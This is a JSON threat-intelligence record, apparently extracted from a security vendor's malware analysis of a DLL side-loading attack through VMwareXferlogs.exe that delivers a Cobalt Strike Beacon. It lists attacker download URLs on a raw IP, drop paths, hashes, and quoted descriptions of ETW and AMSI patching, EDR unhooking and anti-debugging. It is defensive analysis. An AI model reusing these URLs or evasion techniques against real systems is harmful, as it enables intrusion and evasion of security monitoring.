                    {
                        "src": {
                            "id": "<URL_0xfa8a332e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/c0000015.log"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x95aa446f>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xb9535c54>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/glib-2.0.dll"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x1f36c135>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x38d0223e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    }
                ]
            },
            "<UNKNOWNWORD_0x6eb30b3e>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x6eb30b3e>",
                    "type": "UnknownWord",
                    "value": "exitprocess"
                },
                "references": {
                    "sentences": [
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.",
                        "Note that the virtual addresses for the exported functions are all the same for the weaponized glib-2.0.dll (0x1800020d0), except for g_path_get_basename, which has a virtual address of 0x180002420. This is due to the fact that all exports, except for the g_path_get_basename function do nothing other than call ExitProcess()."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x6eb30b3e>",
                            "type": "UnknownWord",
                            "value": "exitprocess"
                        }
                    }
                ]
            },
            "<UNKNOWNWORD_0x5f1ab148>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x5f1ab148>",
                    "type": "UnknownWord",
                    "value": "beingdebugged"
                },
                "references": {
                    "sentences": [
                        "Once control flow is passed to the weaponized DLL, the presence of a debugger is checked by querying the BeingDebugged flag and NtGlobalFlag in the Process Environment Block (PEB). If a debugger is detected, the malware enters an endless loop."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0x9747deac>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x9747deac>",
                    "type": "UnknownWord",
                    "value": "ntglobalflag"
                },
                "references": {
                    "sentences": [
                        "Once control flow is passed to the weaponized DLL, the presence of a debugger is checked by querying the BeingDebugged flag and NtGlobalFlag in the Process Environment Block (PEB). If a debugger is detected, the malware enters an endless loop."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0x93745d7c>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x93745d7c>",
                    "type": "UnknownWord",
                    "value": "syscall"
                },
                "references": {
                    "sentences": [
                        "Here is a look at the patched code to restore the original SYSCALL stub and remove the EDR hook.",
                        "EDR-hooked SYSCALL stub that will be patched",
                        "For example, EDRs userland NT layer hooks may be removed with this technique. The below subroutine shows a trampoline where a SYSCALL stub would typically reside, but instead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to remove the hook."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0x2ff142be>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x2ff142be>",
                    "type": "UnknownWord",
                    "value": "etweventwrite"
                },
                "references": {
                    "sentences": [
                        "Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the EtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0x7a86d374>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x7a86d374>",
                    "type": "UnknownWord",
                    "value": "winapi"
                },
                "references": {
                    "sentences": [
                        "Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the EtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0x22bf527d>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x22bf527d>",
                    "type": "UnknownWord",
                    "value": "etw-related"
                },
                "references": {
                    "sentences": [
                        "Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the EtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0xc0eeb869>": {
                "token": {
                    "id": "<UNKNOWNWORD_0xc0eeb869>",
                    "type": "UnknownWord",
                    "value": "amsiscanbuffer"
                },
                "references": {
                    "sentences": [
                        "AMSI is bypassed the same way as ETW through patching AmsiScanBuffer. This halts AMSI from inspecting potentially suspicious buffers within this process."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0xb92c2b8f>": {
                "token": {
                    "id": "<UNKNOWNWORD_0xb92c2b8f>",
                    "type": "UnknownWord",
                    "value": "rc4-encrypted"
                },
                "references": {
                    "sentences": [
                        "Once these defenses have been bypassed, the malware proceeds to execute the final payload. The final payload is a Cobalt Strike Beacon Reflective Loader that is stored RC4-encrypted in the previously mentioned c0000015.log file. The RC4 Key Scheduling Algorithm can be seen below with the hardcoded 136 byte key.",
                        "A handful of samples related to the malicious DLL were discovered by our investigation. The only notable differences being the RC4 key and name of the file containing the RC4-encrypted payload to decrypt."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0x4cc018e1>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xf683e397>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                                },
                                {
                                    "id": "<FILE_0x5b59fae8>",
                                    "type": "File",
                                    "value": "c0000015.log"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xb92c2b8f>",
                            "type": "UnknownWord",
                            "value": "rc4-encrypted"
                        }
                    }
                ]
            },
            "<UNKNOWNWORD_0xa8f43283>": {
                "token": {
                    "id": "<UNKNOWNWORD_0xa8f43283>",
                    "type": "UnknownWord",
                    "value": "beacons"
                },
                "references": {
                    "sentences": [
                        "The final result is Beacons Reflective Loader, seen below with the familiar magic bytes and hardcoded strings."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0xbef36b76>": {
                "token": {
                    "id": "<UNKNOWNWORD_0xbef36b76>",
                    "type": "UnknownWord",
                    "value": "page_execute_readwrite"
                },
                "references": {
                    "sentences": [
                        "Once decrypted, the region of memory that the payload resides in is made executable (PAGE_EXECUTE_READWRITE), and a new thread is created for this payload to run within."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0x3dbbd6b8>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x3dbbd6b8>",
                    "type": "UnknownWord",
                    "value": "upx-packed"
                },
                "references": {
                    "sentences": [],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x3dbbd6b8>",
                            "type": "UnknownWord",
                            "value": "upx-packed"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x13c7001c>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xe007c24b>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "1458421f0a4fe3acc72a1246b80336dc4138dd4b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x3dbbd6b8>",
                            "type": "UnknownWord",
                            "value": "upx-packed"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x3dbbd6b8>",
                            "type": "UnknownWord",
                            "value": "upx-packed"
                        }
                    }
                ]
            },
            "<UNKNOWNWORD_0x751ee140>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x751ee140>",
                    "type": "UnknownWord",
                    "value": "s0154"
                },
                "references": {
                    "sentences": [],
                    "titles": []
                }
            }
        },
        "sigma": false,
        "yara": true
    },
    "keywords": {
        "classified": [],
        "dubbed": [],
        "associated": [],
        "targets": [],
        "attributed": []
    },
    "resources": {
        "links": {
            "github": [],
            "pastebin": [],
            "text_files": [],
            "other": [
                "https://www.sentinelone.com/blog/author/jamesh/",
                "https://www.sentinelone.com/blog/2022/04/",
                "https://www.sentinelone.com/labs/category/crimeware/",
                "https://www.sentinelone.com/global-services/vigilance-respond-pro/",
                "https://attack.mitre.org/techniques/T1574/002/",
                "https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal",
                "https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal",
                "https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls",
                "https://www.virustotal.com/gui/file/935e10f5169397a67f4c36bffbc3ba46c3957b7521edd3fa83bd975157b79bd8/details",
                "https://kb.vmware.com/s/article/1019471",
                "https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb",
                "https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal",
                "https://attack.mitre.org/techniques/T1027/",
                "https://attack.mitre.org/techniques/T1574/",
                "https://attack.mitre.org/techniques/T1562/002/",
                "https://attack.mitre.org/techniques/T1562/001/",
                "https://attack.mitre.org/techniques/T1027/002/",
                "https://attack.mitre.org/techniques/T1059/001/",
                "https://attack.mitre.org/software/S0154/"
            ]
        },
        "images": [
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/S1-Diagram_Light-scaled.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/signature-info.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/VMware-options.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/empty-calls.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/iE.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/glib-imports.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/empty-calls.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/disassembly-of-glib_2_dll.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/basename-disassembly.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/BeingDebugged.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/memcpy.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/jmp.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/syscall.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/ETW.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/GSHandlerCheck.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/key.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/APC-payload.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/DOS-Magic.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/beacon.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/createFile.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/static-detection-of-LockBit.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/flags.jpg?lossy=0&strip=1&webp=0",
            "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/jmp-to-unpacked-code.jpg?lossy=0&strip=1&webp=0"
        ]
    }
}